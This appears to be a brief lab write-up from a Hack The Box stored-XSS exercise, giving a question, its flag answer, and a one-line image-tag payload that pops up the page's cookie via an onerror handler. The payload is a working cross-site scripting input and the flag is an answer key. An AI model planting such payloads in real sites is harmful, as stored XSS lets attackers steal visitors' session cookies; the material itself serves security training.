# Stored XSS
## Questions
1. To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url. **Answer: HTB{570r3d_f0r_3v3ry0n3_70_533}**
   - Use this payload: `<img/src/onerror=alert(document.cookie)>`